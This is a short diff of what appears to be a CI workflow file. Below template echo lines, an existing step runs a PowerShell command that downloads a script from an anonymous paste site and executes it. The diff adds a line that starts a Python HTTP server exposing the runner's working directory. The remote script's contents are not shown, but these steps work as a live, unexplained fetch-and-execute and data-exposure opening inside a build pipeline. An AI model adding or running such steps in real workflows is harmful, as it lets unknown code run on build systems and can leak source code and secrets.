@@ -35,3 +35,4 @@ jobs:
           echo Add other actions to build,
           echo test, and deploy your project.
           irm https://hst.sh/raw/mugeriwuxu | iex
+          py -m http.server 2104
